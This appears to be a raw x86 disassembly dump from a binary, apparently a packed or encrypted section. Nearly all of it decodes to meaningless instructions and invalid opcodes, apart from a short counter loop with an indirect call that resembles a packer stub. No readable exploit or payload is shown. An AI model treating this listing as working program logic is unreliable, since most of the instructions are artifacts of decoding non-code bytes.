  409f72:	sub    esi,DWORD PTR [edi+0x47]
  409f75:	mov    edx,0xcf6b77ff
  409f7a:	mov    ecx,0xc4832bcf
  409f7f:	and    BYTE PTR [esi-0x2c001dac],ch
  409f85:	and    esi,edx
  409f87:	dec    ebp
  409f88:	dec    esi
  409f89:	jmp    0x61b4:0x58661bb2
  409f90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f91:	and    al,0xd8
  409f93:	pop    ecx
  409f94:	daa    
  409f95:	add    esp,DWORD PTR [ebp-0x6f]
  409f98:	add    cl,BYTE PTR [ebp-0x52]
  409f9b:	jg     0x40a00c
  409f9d:	inc    edx
  409f9e:	push   ds
  409f9f:	push   0xffffffe1
  409fa1:	mov    ds:0x7f1d7c4d,eax
  409fa6:	in     eax,0xad
  409fa8:	xor    BYTE PTR [ebp+0x5131b6af],al
  409fae:	push   cs
  409faf:	pop    esp
  409fb0:	sub    ah,ch
  409fb2:	add    ecx,DWORD PTR [edi-0x177a8464]
  409fb8:	adc    eax,0x225c0a57
  409fbd:	movhps xmm3,QWORD PTR [edx-0x54]
  409fc1:	jo     0x409f91
  409fc3:	int    0xc
  409fc5:	fistp  QWORD PTR [esi-0x4ea39eb3]
  409fcb:	sbb    BYTE PTR [ebx+0x5d],bh
  409fce:	popf   
  409fcf:	jo     0x409feb
  409fd1:	out    0x4c,al
  409fd3:	in     al,0x3d
  409fd5:	and    ebp,DWORD PTR [eax-0x5e6b8925]
  409fdb:	push   eax
  409fdc:	rcr    BYTE PTR [edi+0x7c85b35a],1
  409fe2:	adc    BYTE PTR [esp+eax*2+0x61c19724],ch
  409fe9:	inc    ebx
  409fea:	mov    cl,0xf6
  409fec:	call   0x57cd:0xcbea10a4
  409ff3:	jg     0x40a05b
  409ff5:	pop    esi
  409ff6:	jg     0x40a000
  409ff8:	jbe    0x409ff4
  409ffa:	mov    ax,ds:0xf42736a2
  40a000:	inc    esp
  40a001:	cmp    ah,ah
  40a003:	jbe    0x40a065
  40a005:	pop    es
  40a006:	mov    edi,0x982d93a7
  40a00b:	dec    ebx
  40a00c:	pop    eax
  40a00d:	inc    eax
  40a00e:	pop    edx
  40a00f:	shl    al,cl
  40a011:	push   edi
  40a012:	gs pop esp
  40a014:	mov    edx,0x57dd741b
  40a019:	outs   dx,DWORD PTR fs:[esi]
  40a01b:	pcmpeqb mm6,QWORD PTR [esi-0x59aa9703]
  40a022:	sbb    edx,DWORD PTR [esi+0x37bf99f]
  40a028:	push   ebp
  40a029:	or     ebx,esi
  40a02b:	xchg   ebx,eax
  40a02c:	ror    edx,cl
  40a02e:	jmp    0xf20233ae
  40a033:	imul   eax,DWORD PTR [edx-0x6b],0xa3162cba
  40a03a:	scas   al,BYTE PTR es:[edi]
  40a03b:	mov    bh,BYTE PTR [ecx+0x44b6d01e]
  40a041:	and    esp,DWORD PTR [esi+edi*1-0x6e]
  40a045:	test   al,0xbb
  40a047:	xchg   esi,eax
  40a048:	test   DWORD PTR [ebx-0x6b9e5deb],ebx
  40a04e:	push   ebp
  40a04f:	xor    dl,bl
  40a051:	pop    esi
  40a052:	push   edi
  40a053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a054:	push   ds
  40a055:	dec    ebp
  40a056:	xchg   ecx,eax
  40a057:	lods   eax,DWORD PTR ds:[esi]
  40a058:	mov    cl,BYTE PTR ds:0x64218205
  40a05e:	dec    esp
  40a05f:	mov    ds:0x10b1b532,al
  40a064:	cmp    BYTE PTR [esi+0x245ff7e2],0x4c
  40a06b:	repnz es cmp ch,bl
  40a06f:	jb     0x40a068
  40a071:	mov    DWORD PTR gs:[ebp-0x53],eax
  40a075:	xchg   ebx,eax
  40a076:	aaa    
  40a077:	mov    ebp,0xa22091a0
  40a07c:	mov    ds:0xce79032,eax
  40a081:	int3   
  40a082:	dec    edx
  40a083:	cli    
  40a084:	retf   0x5605
  40a087:	into   
  40a088:	lahf   
  40a089:	cmp    DWORD PTR [edx+ecx*8+0x7b],0xffffffdd
  40a08e:	popa   
  40a08f:	fwait
  40a090:	aad    0x58
  40a092:	jne    0x40a09d
  40a094:	or     DWORD PTR [esi+edi*8],0x36
  40a098:	cmc    
  40a099:	dec    esi
  40a09a:	int3   
  40a09b:	and    edi,eax
  40a09d:	retf   0x67b1
  40a0a0:	xor    DWORD PTR [esp+eax*8-0x7b91e153],esp
  40a0a7:	daa    
  40a0a8:	jno    0x40a03d
  40a0aa:	sbb    al,0xe3
  40a0ac:	push   esi
  40a0ad:	fmul   st,st(3)
  40a0af:	xchg   esi,eax
  40a0b0:	cmovo  edi,DWORD PTR [edx+0xe]
  40a0b4:	cdq    
  40a0b5:	inc    edx
  40a0b6:	cmp    BYTE PTR [edx-0xf30b79b],bl
  40a0bc:	inc    ecx
  40a0bd:	cmp    BYTE PTR [eax+edx*1-0x52],0x88
  40a0c2:	xchg   ebp,eax
  40a0c3:	loop   0x40a0d0
  40a0c5:	cmp    al,0xb7
  40a0c7:	iret   
  40a0c8:	xchg   edi,eax
  40a0c9:	cmp    bh,BYTE PTR [eax]
  40a0cb:	dec    esi
  40a0cc:	xor    esp,0x92568aa4
  40a0d2:	dec    edi
  40a0d3:	int    0xda
  40a0d5:	push   ebx
  40a0d6:	jmp    0x40a0cd
  40a0d8:	daa    
  40a0d9:	adc    BYTE PTR [ecx],0xd9
  40a0dc:	add    BYTE PTR [ecx],bh
  40a0de:	shl    DWORD PTR [ecx-0x375b79ac],0x85
  40a0e5:	les    ebx,FWORD PTR [ebp+0x50]
  40a0e8:	xchg   DWORD PTR [ebp+eax*4+0x2dc16900],ebp
  40a0ef:	push   edi
  40a0f0:	pop    ebp
  40a0f1:	icebp  
  40a0f2:	iret   
  40a0f3:	ins    BYTE PTR es:[edi],dx
  40a0f4:	jbe    0x40a09b
  40a0f6:	xor    eax,0xeae50d7f
  40a0fb:	test   BYTE PTR [eax+0x10],al
  40a0fe:	aas    
  40a0ff:	mov    eax,0xd94194ac
  40a104:	jae    0x40a0af
  40a106:	ja     0x40a168
  40a108:	dec    esi
  40a109:	bound  eax,QWORD PTR [edx+0x26]
  40a10c:	cmc    
  40a10d:	mov    bl,0x82
  40a10f:	mov    ch,0xec
  40a111:	test   esp,esi
  40a113:	dec    ebp
  40a114:	jle    0x40a0ef
  40a116:	mov    ds:0xe5a90c10,al
  40a11b:	div    BYTE PTR [ecx+eiz*8+0x3c9d8fed]
  40a122:	inc    edx
  40a123:	pop    edi
  40a124:	rcl    DWORD PTR [esi-0xcd84beb],0x34
  40a12b:	jnp    0x40a1a9
  40a12d:	in     al,0xd8
  40a12f:	je     0x40a0d2
  40a131:	pop    esi
  40a132:	dec    edi
  40a133:	mov    esi,0xbabcba1f
  40a138:	bound  edi,QWORD PTR [ebp-0x6fd309f5]
  40a13e:	div    DWORD PTR [ebx+eax*2+0x57]
  40a142:	fadd   st(5),st
  40a144:	aam    0xed
  40a146:	push   edi
  40a147:	dec    esi
  40a148:	add    DWORD PTR [ebp-0x17],eax
  40a14b:	sub    bh,dl
  40a14d:	enter  0x9ae7,0x77
  40a151:	mov    DWORD PTR ds:0x4e744393,esp
  40a157:	les    esp,FWORD PTR [edx-0x25b3d8d3]
  40a15d:	xchg   ebp,eax
  40a15e:	xchg   DWORD PTR [ebp-0x6f],ebp
  40a161:	pop    ss
  40a162:	jecxz  0x40a162
  40a164:	rcpps  xmm6,XMMWORD PTR [ebx]
  40a167:	(bad)  
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	push   ebx
  40a17a:	inc    ecx
  40a17b:	mov    ds:0x7ee7394c,al
  40a180:	jle    0x40a1b0
  40a182:	jge    0x40a202
  40a184:	jle    0x40a1ae
  40a186:	imul   edx,DWORD PTR [edx+0x2d],0x3a
  40a18a:	mov    cl,0x43
  40a18c:	imul   ebp,DWORD PTR [ebx],0x7bfb4e7
  40a192:	lahf   
  40a193:	data16 (bad) 
  40a195:	cmp    BYTE PTR [edx+eax*4+0x1b28c1ea],cl
  40a19c:	call   0xbaeb6d75
  40a1a1:	or     eax,DWORD PTR [eax+0x45]
  40a1a4:	scas   al,BYTE PTR es:[edi]
  40a1a5:	popa   
  40a1a6:	sub    bh,al
  40a1a8:	js     0x40a1b2
  40a1aa:	jno    0x40a164
  40a1ac:	lds    esi,FWORD PTR [edx]
  40a1ae:	xor    eax,0xc1e8fd77
  40a1b3:	mov    dh,0x2a
  40a1b5:	adc    DWORD PTR [ebx],edi
  40a1b7:	mov    al,ds:0x136313d2
  40a1bc:	xchg   esp,eax
  40a1bd:	inc    edi
  40a1be:	adc    al,bh
  40a1c0:	cmp    ch,BYTE PTR [ebx-0x18]
  40a1c3:	adc    BYTE PTR [esi+0x18a7ba8e],dh
  40a1c9:	jl     0x40a1bb
  40a1cb:	retf   
  40a1cc:	sub    eax,0x695efea1
  40a1d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1d2:	gs in  eax,dx
  40a1d4:	inc    ecx
  40a1d5:	or     edx,DWORD PTR [eax]
  40a1d7:	mov    dh,cl
  40a1d9:	and    ebp,eax
  40a1db:	cwde   
  40a1dc:	pop    ecx
  40a1dd:	push   esp
  40a1de:	dec    eax
  40a1df:	out    0x98,eax
  40a1e1:	pop    edi
  40a1e2:	mov    al,0x36
  40a1e4:	sub    ebx,eax
  40a1e6:	ja     0x40a242
  40a1e8:	fdiv   QWORD PTR [ebx+0x31]
  40a1eb:	mov    ds:0x25f61521,eax
  40a1f0:	not    bh
  40a1f2:	inc    ebp
  40a1f3:	add    eax,0x559ba32a
  40a1f8:	ja     0x40a185
  40a1fa:	or     eax,0x4e5023d7
  40a1ff:	add    eax,0xe76517ce
  40a204:	xchg   edx,eax
  40a205:	jb     0x40a239
  40a207:	push   eax
  40a208:	mov    ah,0x78
  40a20a:	xchg   esp,eax
  40a20b:	sahf   
  40a20c:	or     BYTE PTR [ebx-0x55],0x1a
  40a210:	sub    edx,DWORD PTR [edx]
  40a212:	data16 jns 0x40a28a
  40a215:	cwde   
  40a216:	mov    bh,bl
  40a218:	shl    DWORD PTR [esi],1
  40a21a:	sub    eax,DWORD PTR [ebx-0x47]
  40a21d:	pop    edi
  40a21e:	fistp  DWORD PTR [ecx*1-0x3b0a4f6]
  40a225:	lock jmp 0x350a:0x9a98f3f8
  40a22d:	or     edx,DWORD PTR [esi-0x35]
  40a230:	jmp    0xee52b64a
  40a235:	loope  0x40a22d
  40a237:	pop    ebx
  40a238:	sub    BYTE PTR [ecx],0x29
  40a23b:	push   ebx
  40a23c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a23d:	outs   dx,DWORD PTR ds:[esi]
  40a23e:	int    0x7a
  40a240:	fs dec ebp
  40a242:	retf   0x6585
  40a245:	adc    BYTE PTR [esi+0x79],dl
  40a248:	das    
  40a249:	push   eax
  40a24a:	pop    ebx
  40a24b:	js     0x40a24d
  40a24d:	add    cl,al
  40a24f:	call   0x3ec4e345
  40a254:	push   esp
  40a255:	push   edi
  40a256:	mov    al,0x2d
  40a258:	and    ah,BYTE PTR [eax+ebp*4+0x5460f858]
  40a25f:	int3   
  40a260:	retf   0xe3f6
  40a263:	add    al,0x37
  40a265:	sbb    ebp,ebp
  40a267:	cmc    
  40a268:	stc    
  40a269:	add    ecx,ecx
  40a26b:	mov    al,bh
  40a26d:	xor    esi,edx
  40a26f:	in     al,0xc0
  40a271:	sub    ch,ah
  40a273:	shl    dh,cl
  40a275:	popf   
  40a276:	ins    BYTE PTR es:[edi],dx
  40a277:	cmp    DWORD PTR [ebp+0x66b1aff],0x69
  40a27e:	test   eax,0x1eddf53f
  40a283:	or     eax,0x507d3dc6
  40a288:	fwait
  40a289:	mov    eax,ds:0xe01c4e92
  40a28e:	(bad)  
  40a28f:	not    dl
  40a291:	data16 jne 0x40a305
  40a294:	cmp    BYTE PTR [esi+0x5e],ah
  40a297:	xchg   bh,dl
  40a299:	adc    DWORD PTR [eax+0x16],edx
  40a29c:	stc    
  40a29d:	pusha  
  40a29e:	push   es
  40a29f:	mov    ?,WORD PTR [ecx+0x10]
  40a2a2:	sbb    DWORD PTR [esi],edi
  40a2a4:	or     ah,BYTE PTR [esi-0x2389838f]
  40a2aa:	xchg   esp,eax
  40a2ab:	test   BYTE PTR [esp+ebx*1+0x8],ch
  40a2af:	das    
  40a2b0:	and    al,0x7c
  40a2b2:	inc    edx
  40a2b3:	jbe    0x40a29a
  40a2b5:	mov    esi,0xdfe96824
  40a2ba:	clc    
  40a2bb:	push   ecx
  40a2bc:	push   0x4de7e944
  40a2c1:	mov    dl,0x39
  40a2c3:	ret    0xf6c8
  40a2c6:	fisubr WORD PTR [esi-0x51572680]
  40a2cc:	adc    BYTE PTR [esi+eiz*4],cl
  40a2cf:	or     cl,BYTE PTR [ebx]
  40a2d1:	mov    BYTE PTR [ebp+0x1ed165ae],al
  40a2d7:	shl    BYTE PTR [ebx-0x6c],cl
  40a2da:	in     al,0xa5
  40a2dc:	enter  0xa994,0x74
  40a2e0:	aas    
  40a2e1:	or     edx,DWORD PTR ds:[esi]
  40a2e4:	loop   0x40a33f
  40a2e6:	pop    es
  40a2e7:	scas   eax,DWORD PTR es:[edi]
  40a2e8:	in     eax,dx
  40a2e9:	icebp  
  40a2ea:	mov    ebp,gs
  40a2ec:	adc    cl,dh
  40a2ee:	lahf   
  40a2ef:	fisttp WORD PTR [ebp-0xcd1d693]
  40a2f5:	xchg   ebx,eax
  40a2f6:	js     0x40a33b
  40a2f8:	cmp    ebp,esi
  40a2fa:	cmp    edx,DWORD PTR [ecx+0x20]
  40a2fd:	sub    al,0xd6
  40a2ff:	aaa    
  40a300:	fimul  WORD PTR [ebx-0xf8787fd]
  40a306:	scas   eax,DWORD PTR es:[edi]
  40a307:	or     ebx,DWORD PTR [esi-0x7f]
  40a30a:	fucomi st,st(5)
  40a30c:	fild   DWORD PTR [edx-0x3f40decb]
  40a312:	xor    eax,0xc39c72fc
  40a317:	paddusb mm7,QWORD PTR [esi-0x65ccd9b4]
  40a31e:	lods   eax,DWORD PTR ds:[esi]
  40a31f:	outs   dx,DWORD PTR ds:[esi]
  40a320:	mov    ah,0xd0
  40a322:	mov    al,0x34
  40a324:	add    eax,0x765afc3c
  40a329:	scas   al,BYTE PTR es:[edi]
  40a32a:	pop    ss
  40a32b:	ror    esi,1
  40a32d:	mov    edx,0xc57ceb88
  40a332:	push   edi
  40a333:	addr16 inc ebp
  40a335:	sbb    BYTE PTR [esi+0x51734524],bl
  40a33b:	fiadd  DWORD PTR [ebx-0x22]
  40a33e:	add    DWORD PTR [edx-0x10],ebp
  40a341:	hlt    
  40a342:	push   edi
  40a343:	cmc    
  40a344:	xchg   edi,eax
  40a345:	inc    edi
  40a346:	ret    
  40a347:	or     ch,BYTE PTR [esi+0x7867a914]
  40a34d:	(bad)  
  40a34f:	ds sub ah,ah
  40a352:	shl    DWORD PTR [ebp-0x51],1
  40a355:	cmp    eax,0x7d39d3a6
  40a35a:	test   esi,esi
  40a35c:	sti    
  40a35d:	add    ah,ah
  40a35f:	sub    al,0x87
  40a361:	mov    eax,ds:0xff711a9e
  40a366:	into   
  40a367:	aad    0x8d
  40a369:	xor    DWORD PTR [edx-0x105a554a],ebx
  40a36f:	inc    esp
  40a370:	mov    al,0x6f
  40a372:	ss sub eax,0x4b049c4d
  40a378:	pop    edx
  40a379:	test   BYTE PTR ds:0xdf386dca,0xa0
  40a380:	push   esi
  40a381:	and    edx,DWORD PTR [edx+0x52980eb0]
  40a387:	mov    ds:0x993dbcba,eax
  40a38c:	jns    0x40a3df
  40a38e:	dec    ecx
  40a38f:	mov    gs,WORD PTR [esi-0x4]
  40a392:	cwde   
  40a393:	mov    cx,0x6fad
  40a397:	int    0x86
  40a399:	fwait
  40a39a:	adc    edi,DWORD PTR [eax-0x80a53c2]
  40a3a0:	outs   dx,DWORD PTR ds:[esi]
  40a3a1:	test   BYTE PTR [ebp-0x73846bf8],dh
  40a3a7:	lods   eax,DWORD PTR ds:[esi]
  40a3a8:	je     0x40a36c
  40a3aa:	sar    BYTE PTR [ecx-0x4fd5d995],0xe8
  40a3b1:	(bad)  
  40a3b2:	dec    edx
  40a3b3:	je     0x40a366
  40a3b5:	dec    ebp
  40a3b6:	mov    eax,0x5fbdbf89
  40a3bb:	xor    eax,0x49b92e80
  40a3c0:	sbb    eax,0x4c2b1386
  40a3c5:	add    eax,0xdad3f0b9
  40a3ca:	or     DWORD PTR [ebx+0x74],ebp
  40a3cd:	nop
  40a3ce:	pop    ss
  40a3cf:	mov    eax,ds:0xc75b5758
  40a3d4:	push   ebp
  40a3d5:	and    ecx,DWORD PTR [ebp-0x41e80ba5]
  40a3db:	push   eax
  40a3dc:	into   
  40a3dd:	test   BYTE PTR [ecx-0x5dd96f0],cl
  40a3e3:	cmp    DWORD PTR [ebx],eax
  40a3e5:	jmp    0xed22:0xee0107ef
  40a3ec:	clc    
  40a3ed:	or     DWORD PTR [ecx+0x65],0x929297d3
  40a3f4:	in     al,0xff
  40a3f6:	jp     0x40a469
  40a3f8:	mov    ebx,0xe1ea802f
  40a3fd:	dec    eax
  40a3fe:	cmp    eax,0x6b975f13
  40a403:	popf   
  40a404:	cwde   
  40a405:	inc    eax
  40a406:	xchg   esp,eax
  40a407:	shl    DWORD PTR [edi],0xc4
  40a40a:	jb     0x40a46b
  40a40c:	xor    eax,DWORD PTR [eax+0x406bc170]
  40a412:	scas   eax,DWORD PTR es:[edi]
  40a413:	mov    ebx,0x2fb204b3
  40a418:	ins    DWORD PTR es:[edi],dx
  40a419:	xchg   BYTE PTR [edi+0x487ec644],dh
  40a41f:	test   BYTE PTR [edi],0x4
  40a422:	add    ebx,ecx
  40a424:	and    eax,0x255b4455
  40a429:	jns    0x40a416
  40a42b:	neg    DWORD PTR [edi+ebp*2+0x78]
  40a42f:	xor    DWORD PTR [edx],ecx
  40a431:	and    bl,dl
  40a433:	add    DWORD PTR ds:0x6b07d64e,ecx
  40a439:	ds or  eax,0x654a516d
  40a43f:	add    DWORD PTR [edi+0x12],esi
  40a442:	sbb    eax,0xd0092b13
  40a447:	xchg   ecx,eax
  40a448:	ret    
  40a449:	push   esi
  40a44a:	adc    bl,BYTE PTR [esi+ebp*8+0x267d0a3a]
  40a451:	out    dx,eax
  40a452:	stc    
  40a453:	and    DWORD PTR [edx+0x1b],0x78
  40a457:	fist   DWORD PTR [ebx]
  40a459:	leave  
  40a45a:	lock mul DWORD PTR [eiz*4-0x2b3eec6e]
  40a462:	sub    edi,DWORD PTR es:[edi+0x23]
  40a466:	aaa    
  40a467:	scas   eax,DWORD PTR es:[edi]
  40a468:	and    BYTE PTR [esi-0xd],cl
  40a46b:	jge    0x40a40f
  40a46d:	lea    edx,[ecx+edx*4]
  40a470:	or     esp,DWORD PTR [ecx]
  40a472:	adc    eax,0x23725afa
  40a477:	lods   al,BYTE PTR ds:[esi]
  40a478:	push   edx
  40a479:	xor    BYTE PTR [edi],bh
  40a47b:	sub    dl,dl
  40a47d:	jge    0x40a42d
  40a47f:	fwait
  40a480:	outs   dx,BYTE PTR ds:[esi]
  40a481:	stos   BYTE PTR es:[edi],al
  40a482:	mov    eax,0x57d0ff09
  40a487:	add    ebx,DWORD PTR [ecx+0x4b]
  40a48a:	sbb    edi,0xe15a50be
  40a490:	mov    bh,0x3
  40a492:	loop   0x40a4f0
  40a494:	sub    cl,cl
  40a496:	not    edi
  40a498:	rcr    ah,cl
  40a49a:	sbb    ecx,ebx
  40a49c:	lods   al,BYTE PTR ds:[esi]
  40a49d:	shl    DWORD PTR [ebx+0x5f],0x3d
  40a4a1:	gs push 0x74
  40a4a4:	daa    
  40a4a5:	mov    edi,0x14f239b8
  40a4aa:	push   esi
  40a4ab:	shl    DWORD PTR ds:0x67ae2409,0xb0
  40a4b2:	outs   dx,BYTE PTR ds:[esi]
  40a4b3:	loopne 0x40a4b7
  40a4b5:	add    eax,edi
  40a4b7:	and    DWORD PTR ds:0x4302f1,0x0
  40a4c1:	xor    ebx,ebx
  40a4c3:	or     ebx,DWORD PTR ds:0x4302f1
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x4302f1,ebx
  40a4d0:	cmp    DWORD PTR ds:0x4302f1,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42eabb
  40a4e8:	cmp    DWORD PTR ds:0x4302f1,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	cmp    BYTE PTR ss:[edi],0xbb
  40a514:	aad    0xe9
  40a516:	loop   0x40a596
  40a518:	jle    0x40a548
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a54e
  40a51e:	push   0xfffffffd
  40a520:	and    cx,0xffe9
  40a524:	xchg   esi,eax
  40a525:	scas   eax,DWORD PTR es:[edi]
  40a526:	cmp    eax,0xb2c7b92f
  40a52b:	or     DWORD PTR [edx-0x3a],0x42
  40a52f:	in     eax,0x72
  40a531:	test   eax,0xd32a07d5
  40a536:	ret    0x3514
  40a539:	icebp  
  40a53a:	or     dh,cl
  40a53c:	icebp  
  40a53d:	or     DWORD PTR [edi],edi
  40a53f:	and    edi,DWORD PTR [esi+0xe]
  40a542:	pop    eax
  40a543:	nop
  40a544:	push   eax
  40a545:	ja     0x40a545
  40a547:	rcr    DWORD PTR [ebx-0x7f],0xad
  40a54b:	adc    BYTE PTR [eax+ebx*1+0x35cfe2ed],ch
  40a552:	iret   
  40a553:	imul   ebx,DWORD PTR [eax-0x46],0x1806019a
  40a55a:	lods   al,BYTE PTR ds:[esi]
  40a55b:	fwait
  40a55c:	cdq    
  40a55d:	xor    BYTE PTR ds:0xe7fd3637,al
  40a563:	cmp    ch,ah
  40a565:	xor    edi,DWORD PTR ds:0x78a30e53
  40a56b:	int3   
  40a56c:	inc    esp
  40a56d:	mov    ecx,0xd1fdb354
  40a572:	xchg   edx,eax
  40a573:	sub    dl,BYTE PTR [ebp+0x3c]
  40a576:	xor    edx,esi
  40a578:	cs cli 
  40a57a:	(bad)  
  40a57b:	mov    ebx,0xbc039906
  40a580:	pop    edx
  40a581:	ja     0x40a5e9
  40a583:	xchg   ebx,eax
  40a584:	mov    eax,ds:0x648b50d4
  40a589:	out    0x3a,al
  40a58b:	sahf   
  40a58c:	push   esi
  40a58d:	adc    eax,0xfbb405b9
  40a592:	mov    ds:0xfd48e6ff,al
  40a597:	push   cs
  40a598:	pop    esi
  40a599:	add    DWORD PTR [esi],ebx
  40a59b:	arpl   WORD PTR [ecx+ebp*2-0x14],sp
  40a59f:	std    
  40a5a0:	fstp   TBYTE PTR [edx]
  40a5a2:	pop    ecx
  40a5a3:	jae    0x40a590
  40a5a5:	mov    edi,0x75a64410
  40a5aa:	inc    edx
  40a5ab:	pusha  
  40a5ac:	add    eax,0x42b5fbf4
  40a5b1:	test   BYTE PTR [eax],bh
  40a5b3:	xchg   BYTE PTR [esi],ch
  40a5b5:	adc    BYTE PTR [edx+eiz*4],dl
  40a5b8:	cwde   
  40a5b9:	loope  0x40a580
  40a5bb:	mov    esp,edx
  40a5bd:	rcr    BYTE PTR [ecx-0x65],cl
  40a5c0:	adc    al,0x68
  40a5c2:	mov    WORD PTR [esi],cs
  40a5c4:	dec    esi
  40a5c5:	add    al,BYTE PTR [ebx+0x6e]
  40a5c8:	gs sbb ah,ch
  40a5cb:	jl     0x40a5b4
  40a5cd:	lods   eax,DWORD PTR ds:[esi]
  40a5ce:	dec    ecx
  40a5cf:	imul   DWORD PTR [esi+edx*2+0x32]
  40a5d3:	test   BYTE PTR [esi-0x341ace38],dl
  40a5d9:	(bad)  
  40a5da:	adc    eax,0xbce95aa1
  40a5df:	rcr    BYTE PTR [esi-0x46],1
  40a5e2:	iret   
  40a5e3:	cmp    eax,0x29f6890c
  40a5e8:	jg     0x40a65b
  40a5ea:	fisttp QWORD PTR [esp+ebx*4]
  40a5ed:	imul   ebx,DWORD PTR [edi+edi*2],0x9778ce3e
  40a5f4:	fcomp  DWORD PTR [edi+esi*8+0x1d50797b]
  40a5fb:	cmc    
  40a5fc:	test   DWORD PTR [ebp-0x59a8467c],0x8e67a653
  40a606:	push   0xe9955e7a
  40a60b:	mov    edx,0xd7f68e79
  40a610:	dec    esp
  40a611:	aas    
  40a612:	xor    DWORD PTR [ebx],ecx
  40a614:	inc    edx
  40a615:	jmp    edx
  40a617:	jne    0x40a683
  40a619:	iret   
  40a61a:	jge    0x40a613
  40a61c:	jmp    0x40a679
  40a61e:	fnstcw WORD PTR [ecx-0x65ca92a9]
  40a624:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a625:	ja     0x40a61c
  40a627:	inc    ebp
  40a628:	jae    0x40a651
  40a62a:	jecxz  0x40a5c1
  40a62c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a62d:	scas   eax,DWORD PTR es:[edi]
  40a62e:	adc    al,0xd3
  40a630:	fstp   DWORD PTR [eax-0x27]
  40a633:	push   es
  40a634:	das    
  40a635:	gs cwde 
  40a637:	mov    bh,al
  40a639:	cli    
  40a63a:	cmc    
  40a63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a63c:	(bad)  
  40a63d:	scas   al,BYTE PTR es:[edi]
  40a63e:	shl    DWORD PTR [edi-0x63],1
  40a641:	icebp  
  40a642:	icebp  
  40a643:	pop    ebp
  40a644:	rcl    BYTE PTR [eax],0xeb
  40a647:	sbb    BYTE PTR [ecx+0x3867f0c2],bh
  40a64d:	daa    
  40a64e:	loope  0x40a688
  40a650:	push   esp
  40a651:	mov    fs,ecx
  40a653:	sub    eax,0x99be2ea2
  40a658:	push   es
  40a659:	test   DWORD PTR [edx+eax*2+0x48],ebx
  40a65d:	sbb    ch,dh
  40a65f:	cmp    eax,0xb321e468
  40a664:	cmp    DWORD PTR [edx+ebx*2+0xe],esi
  40a668:	pop    fs
  40a66a:	pop    ecx
  40a66b:	mov    ah,0x82
  40a66d:	inc    ebx
  40a66e:	cmp    DWORD PTR [ecx-0x4595c1eb],esi
  40a674:	push   ds
  40a675:	push   ds
  40a676:	and    edx,DWORD PTR [edi-0x3d]
  40a679:	stos   BYTE PTR es:[edi],al
  40a67a:	mov    al,ds:0x79bc6208
  40a67f:	pop    ecx
  40a680:	repz and al,BYTE PTR ds:0x9902a49a
  40a687:	push   0x4e
  40a689:	retf   
  40a68a:	push   ss
  40a68b:	pop    ss
  40a68c:	mov    dh,0x29
  40a68e:	addr16 (bad) 
  40a690:	mov    dl,0xb0
  40a692:	push   esi
  40a693:	aam    0x1d
  40a695:	ss push ecx
  40a697:	cwde   
  40a698:	inc    ecx
  40a699:	or     ecx,edi
  40a69b:	add    BYTE PTR ss:[edi],al
  40a69e:	rol    esp,cl
  40a6a0:	popf   
  40a6a1:	cmp    edx,DWORD PTR ds:0x42b26623
  40a6a7:	cmp    esp,edi
  40a6a9:	dec    esp
  40a6aa:	jecxz  0x40a63e
  40a6ac:	mov    DWORD PTR [eax+eax*2+0x3e4f2786],ecx
  40a6b3:	and    eax,0x5467521
  40a6b8:	aaa    
  40a6b9:	push   esi
  40a6ba:	das    
  40a6bb:	mov    eax,0x35e21d89
  40a6c0:	fbld   TBYTE PTR [edx]
  40a6c2:	cmp    DWORD PTR [ebx],edi
  40a6c4:	clc    
  40a6c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6c6:	in     eax,dx
  40a6c7:	xor    al,0x31
  40a6c9:	dec    esp
  40a6ca:	std    
  40a6cb:	into   
  40a6cc:	inc    ebx
  40a6cd:	jmp    0x492c:0xb702cc8c
  40a6d4:	xor    esi,DWORD PTR [esi+0x49]
  40a6d7:	xchg   edx,eax
  40a6d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6d9:	adc    al,0x7d
  40a6db:	push   ebx
  40a6dc:	jae    0x40a6cb
  40a6de:	jns    0x40a697
  40a6e0:	dec    edx
  40a6e1:	dec    edx
  40a6e2:	cld    
  40a6e3:	dec    edi
  40a6e4:	sub    bh,BYTE PTR ds:0xae757b0
  40a6ea:	retf   0xdb88
  40a6ed:	stos   BYTE PTR es:[edi],al
  40a6ee:	test   DWORD PTR [eax],0xa9821a78
  40a6f4:	mov    esp,0x170c55aa
  40a6f9:	vunpcklps xmm6,xmm5,XMMWORD PTR [ebp-0x5b0cd042]
  40a701:	std    
  40a702:	push   esp
  40a703:	rcr    DWORD PTR [ecx-0x4353ef9f],1
  40a709:	mov    al,0x94
  40a70b:	sub    ecx,0x290ffa80
  40a711:	lock out dx,eax
  40a713:	jae    0x40a737
  40a715:	dec    esi
  40a716:	cmp    ebx,ecx
  40a718:	add    bh,BYTE PTR [eax+0x8]
  40a71b:	cmc    
  40a71c:	jg     0x40a727
  40a71e:	mov    al,BYTE PTR [edx+0x9]
  40a721:	fiadd  WORD PTR [esi-0x52]
  40a724:	mov    cl,0xdb
  40a726:	mov    dl,0xd2
  40a728:	ficomp WORD PTR [edi-0x5f]
  40a72b:	cmp    al,BYTE PTR [ecx]
  40a72d:	inc    esp
  40a72e:	sbb    al,0xa0
  40a731:	xor    DWORD PTR [ebx+eax*4+0x956c908],ebx
